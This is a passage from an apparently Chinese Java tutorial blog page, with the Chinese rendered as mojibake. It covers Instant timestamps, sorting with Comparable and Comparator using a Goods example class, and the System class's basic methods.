<li>åœ¨å¤„ç†æ—¶é—´å’Œæ—¥æœŸçš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæƒ³åˆ°å¹´,æœˆ,æ—¥,æ—¶,åˆ†,ç§’ã€‚ç„¶è€Œï¼Œè¿™åªæ˜¯æ—¶é—´çš„ä¸€ä¸ªæ¨¡å‹ï¼Œæ˜¯é¢å‘äººç±»çš„ã€‚ç¬¬äºŒç§é€šç”¨æ¨¡å‹æ˜¯é¢å‘æœºå™¨çš„ï¼Œæˆ–è€…è¯´æ˜¯è¿ç»­çš„ã€‚åœ¨æ­¤æ¨¡å‹ä¸­ï¼Œæ—¶é—´çº¿ä¸­çš„ä¸€ä¸ªç‚¹è¡¨ç¤ºä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè¿™æœ‰åˆ©äºè®¡ç®—æœºå¤„ç†ã€‚åœ¨UNIXä¸­ï¼Œè¿™ä¸ªæ•°ä»1970å¹´å¼€å§‹ï¼Œä»¥ç§’ä¸ºçš„å•ä½ï¼›åŒæ ·çš„ï¼Œåœ¨Javaä¸­ï¼Œä¹Ÿæ˜¯ä»1970å¹´å¼€å§‹ï¼Œä½†ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</li>
<li>java.timeåŒ…é€šè¿‡å€¼ç±»å‹Instantæä¾›æœºå™¨è§†å›¾ï¼Œä¸æä¾›å¤„ç†äººç±»æ„ä¹‰ä¸Šçš„æ—¶é—´å•ä½ã€‚Instantè¡¨ç¤ºæ—¶é—´çº¿ä¸Šçš„ä¸€ç‚¹ï¼Œè€Œä¸éœ€è¦ä»»ä½•ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œæ—¶åŒºã€‚æ¦‚å¿µä¸Šè®²ï¼Œå®ƒåªæ˜¯ç®€å•çš„è¡¨ç¤ºè‡ª1970å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’ï¼ˆUTCï¼‰å¼€å§‹çš„ç§’æ•°ã€‚å› ä¸ºjava.timeåŒ…æ˜¯åŸºäºçº³ç§’è®¡ç®—çš„ï¼Œæ‰€ä»¥Instantçš„ç²¾åº¦å¯ä»¥è¾¾åˆ°çº³ç§’çº§ã€‚</li>
<li>(1 ns &#x3D; 10-9s)   1ç§’&#x3D; 1000æ¯«ç§’&#x3D;10^6å¾®ç§’&#x3D;10^9çº³ç§’</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4a960f7e7bfc8b68f5cb42eaebbc0064--95a7--02.png" alt="02"></p>
<ul>
<li>æ—¶é—´æˆ³æ˜¯æŒ‡æ ¼æ—å¨æ²»æ—¶é—´1970å¹´01æœˆ01æ—¥00æ—¶00åˆ†00ç§’(åŒ—äº¬æ—¶é—´1970å¹´01æœˆ01æ—¥08æ—¶00åˆ†00ç§’)èµ·è‡³ç°åœ¨çš„æ€»ç§’æ•°ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/512c704c1691e6d466a59c9e120b99ba--9137--03.png" alt="03"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.time.OffsetDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.ZoneOffset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//now():è·å–æœ¬åˆå­åˆçº¿å¯¹åº”çš„æ ‡å‡†æ—¶é—´</span></span><br><span class="line">        <span class="type">Instant</span> <span class="variable">instant</span> <span class="operator">=</span> Instant.now();</span><br><span class="line">        System.out.println(instant);<span class="comment">//2024-09-17T07:10:05.668448200Z</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ·»åŠ æ—¶é—´çš„åç§»é‡</span></span><br><span class="line">        <span class="type">OffsetDateTime</span> <span class="variable">offsetDateTime</span> <span class="operator">=</span> instant.atOffset(ZoneOffset.ofHours(<span class="number">8</span>));<span class="comment">//ä¸œå…«åŒº</span></span><br><span class="line">        System.out.println(offsetDateTime); <span class="comment">//2024-09-17T15:10:05.668448200+08:00</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//toEpochMilli():è·å–è‡ª1970å¹´1æœˆ1æ—¥0æ—¶0åˆ†0ç§’ï¼ˆUTCï¼‰å¼€å§‹çš„æ¯«ç§’æ•°  ---&gt; Dateç±»çš„getTime()</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">milli</span> <span class="operator">=</span> instant.toEpochMilli();</span><br><span class="line">        System.out.println(milli);  <span class="comment">//1726557005668</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ofEpochMilli():é€šè¿‡ç»™å®šçš„æ¯«ç§’æ•°ï¼Œè·å–Instantå®ä¾‹  --&gt;Date(long millis)</span></span><br><span class="line">        <span class="type">Instant</span> <span class="variable">instant1</span> <span class="operator">=</span> Instant.ofEpochMilli(<span class="number">1550475314878L</span>);</span><br><span class="line">        System.out.println(instant1);   <span class="comment">//2019-02-18T07:35:14.878Z</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4ã€Javaæ¯”è¾ƒå™¨"><a href="#4ã€Javaæ¯”è¾ƒå™¨" class="headerlink" title="4ã€Javaæ¯”è¾ƒå™¨"></a>4ã€Javaæ¯”è¾ƒå™¨</h3><h4 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* ä¸€ã€è¯´æ˜ï¼šJavaä¸­çš„å¯¹è±¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œåªèƒ½è¿›è¡Œæ¯”è¾ƒï¼š==  æˆ–  != ã€‚ä¸èƒ½ä½¿ç”¨ &gt; æˆ– &lt; çš„</span></span><br><span class="line"><span class="comment">*          ä½†æ˜¯åœ¨å¼€å‘åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å¤šä¸ªå¯¹è±¡è¿›è¡Œæ’åºï¼Œè¨€å¤–ä¹‹æ„ï¼Œå°±éœ€è¦æ¯”è¾ƒå¯¹è±¡çš„å¤§å°ã€‚</span></span><br><span class="line"><span class="comment">*          å¦‚ä½•å®ç°ï¼Ÿä½¿ç”¨ä¸¤ä¸ªæ¥å£ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼šComparable æˆ– Comparator</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>Javaå®ç°å¯¹è±¡æ’åºçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li>è‡ªç„¶æ’åºï¼šjava.lang.Comparable</li>
<li>å®šåˆ¶æ’åºï¼šjava.util.Comparator</li>
</ul>
</li>
<li><p>Comparableè‡ªç„¶æ’åºä¸¾ä¾‹</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          Comparableæ¥å£çš„ä½¿ç”¨ä¸¾ä¾‹ï¼š  è‡ªç„¶æ’åº</span></span><br><span class="line"><span class="comment">          1.åƒStringã€åŒ…è£…ç±»ç­‰å®ç°äº†Comparableæ¥å£ï¼Œé‡å†™äº†compareTo(obj)æ–¹æ³•ï¼Œç»™å‡ºäº†æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡å¤§å°çš„æ–¹å¼ã€‚</span></span><br><span class="line"><span class="comment">          2.åƒStringã€åŒ…è£…ç±»é‡å†™compareTo()æ–¹æ³•ä»¥åï¼Œè¿›è¡Œäº†ä»å°åˆ°å¤§çš„æ’åˆ—</span></span><br><span class="line"><span class="comment">          3. é‡å†™compareTo(obj)çš„è§„åˆ™ï¼š</span></span><br><span class="line"><span class="comment">             å¦‚æœå½“å‰å¯¹è±¡thiså¤§äºå½¢å‚å¯¹è±¡objï¼Œåˆ™è¿”å›æ­£æ•´æ•°ï¼Œ</span></span><br><span class="line"><span class="comment">             å¦‚æœå½“å‰å¯¹è±¡thiså°äºå½¢å‚å¯¹è±¡objï¼Œåˆ™è¿”å›è´Ÿæ•´æ•°ï¼Œ</span></span><br><span class="line"><span class="comment">             å¦‚æœå½“å‰å¯¹è±¡thisç­‰äºå½¢å‚å¯¹è±¡objï¼Œåˆ™è¿”å›é›¶ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;CC&quot;</span>,<span class="string">&quot;KK&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;GG&quot;</span>,<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr)); <span class="comment">//[AA, CC, DD, GG, JJ, KK, MM]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2ã€è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åº"><a href="#2ã€è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åº" class="headerlink" title="2ã€è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åº"></a>2ã€è‡ªå®šä¹‰ç±»å®ç°Comparableè‡ªç„¶æ’åº</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 4.å¯¹äºè‡ªå®šä¹‰ç±»æ¥è¯´ï¼Œå¦‚æœéœ€è¦æ’åºï¼Œæˆ‘ä»¬å¯ä»¥è®©è‡ªå®šä¹‰ç±»å®ç°Comparableæ¥å£ï¼Œé‡å†™compareTo(obj)æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">     *   åœ¨compareTo(obj)æ–¹æ³•ä¸­æŒ‡æ˜å¦‚ä½•æ’åº</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test2(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">        Goods[] arr = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">5</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;lenovoMouse&quot;</span>,<span class="number">34</span>);</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;dellMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;xiaomiMouse&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">65</span>);</span><br><span class="line">        arr[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;microsoftMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(arr));  <span class="comment">//[Goods&#123;name=&#x27;xiaomiMouse&#x27;, price=12.0&#125;, Goods&#123;name=&#x27;lenovoMouse&#x27;, price=34.0&#125;, Goods&#123;name=&#x27;microsoftMouse&#x27;, price=43.0&#125;, Goods&#123;name=&#x27;dellMouse&#x27;, price=43.0&#125;, Goods&#123;name=&#x27;huaweiMouse&#x27;, price=65.0&#125;]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Goodsç±»</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Goods</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Goods</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Goods</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Goods&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æŒ‡æ˜å•†å“æ¯”è¾ƒå¤§å°çš„æ–¹å¼:æŒ‰ç…§ä»·æ ¼ä»ä½åˆ°é«˜æ’åº,å†æŒ‰ç…§äº§å“åç§°ä»é«˜åˆ°ä½æ’åº</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;**************&quot;);</span></span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Goods goods)&#123;</span><br><span class="line">            <span class="comment">//æ–¹å¼ä¸€ï¼š</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">this</span>.price &gt; goods.price)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.price &lt; goods.price)&#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//                return 0;</span></span><br><span class="line">                <span class="keyword">return</span> -<span class="built_in">this</span>.name.compareTo(goods.name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//æ–¹å¼äºŒï¼š</span></span><br><span class="line"><span class="comment">//           return Double.compare(this.price,goods.price);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        return 0;</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ä¼ å…¥çš„æ•°æ®ç±»å‹ä¸ä¸€è‡´ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3ã€ä½¿ç”¨Comparatorå®ç°å®šåˆ¶æ’åº"><a href="#3ã€ä½¿ç”¨Comparatorå®ç°å®šåˆ¶æ’åº" class="headerlink" title="3ã€ä½¿ç”¨Comparatorå®ç°å®šåˆ¶æ’åº"></a>3ã€ä½¿ç”¨Comparatorå®ç°å®šåˆ¶æ’åº</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompareTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Comparatoræ¥å£çš„ä½¿ç”¨ï¼šå®šåˆ¶æ’åº</span></span><br><span class="line"><span class="comment">     *     1.èƒŒæ™¯ï¼š</span></span><br><span class="line"><span class="comment">     *     å½“å…ƒç´ çš„ç±»å‹æ²¡æœ‰å®ç°java.lang.Comparableæ¥å£è€Œåˆä¸æ–¹ä¾¿ä¿®æ”¹ä»£ç ï¼Œ</span></span><br><span class="line"><span class="comment">     *     æˆ–è€…å®ç°äº†java.lang.Comparableæ¥å£çš„æ’åºè§„åˆ™ä¸é€‚åˆå½“å‰çš„æ“ä½œï¼Œ</span></span><br><span class="line"><span class="comment">     *     é‚£ä¹ˆå¯ä»¥è€ƒè™‘ä½¿ç”¨ Comparator çš„å¯¹è±¡æ¥æ’åº</span></span><br><span class="line"><span class="comment">     *     2.é‡å†™compare(Object o1,Object o2)æ–¹æ³•ï¼Œæ¯”è¾ƒo1å’Œo2çš„å¤§å°ï¼š</span></span><br><span class="line"><span class="comment">     *     å¦‚æœæ–¹æ³•è¿”å›æ­£æ•´æ•°ï¼Œåˆ™è¡¨ç¤ºo1å¤§äºo2ï¼›</span></span><br><span class="line"><span class="comment">     *     å¦‚æœè¿”å›0ï¼Œè¡¨ç¤ºç›¸ç­‰ï¼›</span></span><br><span class="line"><span class="comment">     *     è¿”å›è´Ÿæ•´æ•°ï¼Œè¡¨ç¤ºo1å°äºo2ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;CC&quot;</span>,<span class="string">&quot;KK&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;GG&quot;</span>,<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>&#125;;</span><br><span class="line">        Arrays.sort(arr,<span class="keyword">new</span> <span class="title class_">Comparator</span>()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æŒ‰ç…§å­—ç¬¦ä¸²ä»å¤§åˆ°å°çš„é¡ºåºæ’åˆ—</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> String &amp;&amp; o2 <span class="keyword">instanceof</span>  String)&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> (String) o1;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> (String) o2;</span><br><span class="line">                    <span class="keyword">return</span> -s1.compareTo(s2);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                return 0;</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;è¾“å…¥çš„æ•°æ®ç±»å‹ä¸ä¸€è‡´&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span>&#123;</span><br><span class="line">        Goods[] arr = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">6</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;lenovoMouse&quot;</span>,<span class="number">34</span>);</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;dellMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;xiaomiMouse&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">65</span>);</span><br><span class="line">        arr[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;huaweiMouse&quot;</span>,<span class="number">224</span>);</span><br><span class="line">        arr[<span class="number">5</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;microsoftMouse&quot;</span>,<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">        Arrays.sort(arr, <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">            <span class="comment">//æŒ‡æ˜å•†å“æ¯”è¾ƒå¤§å°çš„æ–¹å¼:æŒ‰ç…§äº§å“åç§°ä»ä½åˆ°é«˜æ’åº,å†æŒ‰ç…§ä»·æ ¼ä»é«˜åˆ°ä½æ’åº</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> Goods &amp;&amp; o2 <span class="keyword">instanceof</span> Goods)&#123;</span><br><span class="line">                    <span class="type">Goods</span> <span class="variable">g1</span> <span class="operator">=</span> (Goods)o1;</span><br><span class="line">                    <span class="type">Goods</span> <span class="variable">g2</span> <span class="operator">=</span> (Goods)o2;</span><br><span class="line">                    <span class="keyword">if</span>(g1.getName().equals(g2.getName()))&#123;</span><br><span class="line">                        <span class="keyword">return</span> -Double.compare(g1.getPrice(),g2.getPrice());</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> g1.getName().compareTo(g2.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;è¾“å…¥çš„æ•°æ®ç±»å‹ä¸ä¸€è‡´&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Comparableæ¥å£ä¸Comparatorçš„ä½¿ç”¨çš„å¯¹æ¯”</strong>ï¼š<ul>
<li>Comparableæ¥å£çš„æ–¹å¼ä¸€æ—¦ä¸€å®šï¼Œä¿è¯Comparableæ¥å£å®ç°ç±»çš„å¯¹è±¡åœ¨ä»»ä½•ä½ç½®éƒ½å¯ä»¥æ¯”è¾ƒå¤§å°ã€‚</li>
<li>Comparatoræ¥å£å±äºä¸´æ—¶æ€§çš„æ¯”è¾ƒã€‚</li>
</ul>
</li>
</ul>
<h3 id="5ã€Systemç±»ã€Mathç±»ã€BigIntegerä¸BigDecimal"><a href="#5ã€Systemç±»ã€Mathç±»ã€BigIntegerä¸BigDecimal" class="headerlink" title="5ã€Systemç±»ã€Mathç±»ã€BigIntegerä¸BigDecimal"></a>5ã€Systemç±»ã€Mathç±»ã€BigIntegerä¸BigDecimal</h3><h4 id="1ã€Systemç±»"><a href="#1ã€Systemç±»" class="headerlink" title="1ã€Systemç±»"></a>1ã€Systemç±»</h4><ul>
<li><p>Systemç±»ä»£è¡¨ç³»ç»Ÿï¼Œç³»ç»Ÿçº§çš„å¾ˆå¤šå±æ€§å’Œæ§åˆ¶æ–¹æ³•éƒ½æ”¾ç½®åœ¨è¯¥ç±»çš„å†…éƒ¨ã€‚è¯¥ç±»ä½äºjava.langåŒ…ã€‚</p>
</li>
<li><p>ç”±äºè¯¥ç±»çš„æ„é€ å™¨æ˜¯privateçš„ï¼Œæ‰€ä»¥æ— æ³•åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ— æ³•å®ä¾‹åŒ–è¯¥ç±»ã€‚å…¶å†…éƒ¨çš„æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•éƒ½æ˜¯staticçš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿›è¡Œè°ƒç”¨ã€‚</p>
</li>
<li><p>æˆå‘˜å˜é‡</p>
<ul>
<li>Systemç±»å†…éƒ¨åŒ…å«inã€outå’Œerrä¸‰ä¸ªæˆå‘˜å˜é‡ï¼Œåˆ†åˆ«ä»£è¡¨æ ‡å‡†è¾“å…¥æµ(é”®ç›˜è¾“å…¥)ï¼Œæ ‡å‡†è¾“å‡ºæµ(æ˜¾ç¤ºå™¨)å’Œæ ‡å‡†é”™è¯¯è¾“å‡ºæµ(æ˜¾ç¤ºå™¨)ã€‚</li>
</ul>
</li>
<li><p>æˆå‘˜æ–¹æ³•</p>
<ul>
<li><p>native long currentTimeMillis()ï¼š</p>
<blockquote>
<p>è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯è¿”å›å½“å‰çš„è®¡ç®—æœºæ—¶é—´ï¼Œæ—¶é—´çš„è¡¨è¾¾æ ¼å¼ä¸ºå½“å‰è®¡ç®—æœºæ—¶é—´å’ŒGMTæ—¶é—´(æ ¼æ—å¨æ²»æ—¶é—´)1970å¹´1æœˆ1å·0æ—¶0åˆ†0ç§’æ‰€å·®çš„æ¯«ç§’æ•°ã€‚</p>
</blockquote>
</li>
<li><p>void exit(int status)ï¼š</p>
<blockquote>
<p>è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯é€€å‡ºç¨‹åºã€‚å…¶ä¸­statusçš„å€¼ä¸º0ä»£è¡¨æ­£å¸¸é€€å‡ºï¼Œéé›¶ä»£è¡¨å¼‚å¸¸é€€å‡ºã€‚ä½¿ç”¨è¯¥æ–¹æ³•å¯ä»¥åœ¨å›¾å½¢ç•Œé¢ç¼–ç¨‹ä¸­å®ç°ç¨‹åºçš„é€€å‡ºåŠŸèƒ½ç­‰ã€‚</p>
</blockquote>
</li>
<li><p>void gc()ï¼š</p>
<blockquote>
<p>è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯è¯·æ±‚ç³»ç»Ÿè¿›è¡Œåƒåœ¾å›æ”¶ã€‚è‡³äºç³»ç»Ÿæ˜¯å¦ç«‹åˆ»å›æ”¶ï¼Œåˆ™å–å†³äºç³»ç»Ÿä¸­åƒåœ¾å›æ”¶ç®—æ³•çš„å®ç°ä»¥åŠç³»ç»Ÿæ‰§è¡Œæ—¶çš„æƒ…å†µã€‚ïƒ˜String </p>
</blockquote>
</li>
<li><p>getProperty(String key)ï¼š</p>
<blockquote>
<p>è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯è·å¾—ç³»ç»Ÿä¸­å±æ€§åä¸ºkeyçš„å±æ€§å¯¹åº”çš„å€¼ã€‚ç³»ç»Ÿä¸­å¸¸è§çš„å±æ€§åä»¥åŠå±æ€§çš„ä½œç”¨å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/73bb56682e583202b5dce7dadb23a2d0--3b71--06.png" alt="06"></p>
